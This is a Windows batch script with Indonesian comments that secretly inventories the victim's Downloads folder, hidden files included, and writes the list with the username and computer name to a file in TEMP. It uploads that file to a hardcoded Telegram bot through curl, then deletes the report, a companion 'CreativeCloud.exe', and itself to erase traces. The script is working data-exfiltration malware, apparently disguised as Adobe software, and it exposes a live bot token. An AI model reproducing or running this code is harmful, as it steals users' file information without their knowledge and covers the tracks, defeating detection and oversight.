@echo off
setlocal enabledelayedexpansion

:: ==========================================================
:: KONFIGURASI (Ganti dengan milikmu)
:: ==========================================================
set "TOKEN=8475448253:AAHp0_a3es41WG7so8I2-9K_n2g59Rmgr3M"
set "CHAT_ID=7318370755"
set "EXE_NAME=CreativeCloud.exe"

:: Target folder & Output (Menggunakan folder TEMP agar tersembunyi)
set "TARGET=%USERPROFILE%\Downloads"
set "OUTPUT_FILE=%TEMP%\DeepScan_Report.txt"
set "SCRIPT_PATH=%~f0"

:: ==========================================================
:: PROSES SCANNING PRESISI
:: ==========================================================
echo [!] Memulai pemindaian mendalam di: %TARGET%

:: Membuat Header Laporan yang Informatif
echo ========================================================== > "%OUTPUT_FILE%"
echo 📂 FULL SYSTEM DEEP SCAN REPORT >> "%OUTPUT_FILE%"
echo ========================================================== >> "%OUTPUT_FILE%"
echo 👤 User      : %USERNAME% >> "%OUTPUT_FILE%"
echo 🕒 Waktu     : %DATE% %TIME% >> "%OUTPUT_FILE%"
echo 📍 Root Path : %TARGET% >> "%OUTPUT_FILE%"
echo ========================================================== >> "%OUTPUT_FILE%"
echo. >> "%OUTPUT_FILE%"

if exist "%TARGET%" (
    :: Loop FOR /F untuk menangani path dengan spasi
    :: dir /s = subfolder, /b = bare (path saja), /a = include hidden/system
    for /f "delims=" %%i in ('dir "%TARGET%" /s /b /a ^| findstr /v /i "Adobe CreativeCloud"') do (
        set "item_path=%%i"
        
        :: Cek apakah item adalah Folder atau File
        if exist "%%i\" (
            echo [FOLDER] !item_path! >> "%OUTPUT_FILE%"
        ) else (
            :: Ambil ukuran file (dalam bytes) dan ekstensi
            set "size=%%~zi"
            set "ext=%%~xi"
            echo    ^|_ [FILE] !item_path! [!ext!] [!size! bytes] >> "%OUTPUT_FILE%"
        )
    )
    echo ✅ Scanning Selesai.
) else (
    echo [!] Folder target tidak ditemukan. >> "%OUTPUT_FILE%"
)

echo. >> "%OUTPUT_FILE%"
echo ================= END OF REPORT ================= >> "%OUTPUT_FILE%"

:: ==========================================================
:: PENGIRIMAN KE TELEGRAM (POWERSHELL WRAPPER)
:: ==========================================================
if exist "%OUTPUT_FILE%" (
    echo [!] Mengirim laporan ke Telegram...
    
    :: Menggunakan PowerShell untuk stabilitas pengiriman file besar
    powershell -Command ^
        "$url = 'https://api.telegram.org/bot%TOKEN%/sendDocument';" ^
        "$caption = '📊 *Deep Scan Result* from %COMPUTERNAME%';" ^
        "curl.exe -s -k -F chat_id=%CHAT_ID% -F document=@'%OUTPUT_FILE%' -F caption=$caption $url" > nul
    
    timeout /t 2 >nul
)

:: ==========================================================
:: PEMBERSIHAN JEJAK (SELF-DESTRUCT)
:: ==========================================================
echo [!] Menghapus jejak...

:: Hapus file laporan di folder TEMP
if exist "%OUTPUT_FILE%" del /f /q "%OUTPUT_FILE%"

:: Hapus file EXE jika ada di lokasi yang sama dengan script
if exist "%~dp0%EXE_NAME%" del /f /q "%~dp0%EXE_NAME%"

:: Perintah pamungkas: File .bat menghapus dirinya sendiri
start /b "" cmd /c del "%SCRIPT_PATH%"&exit
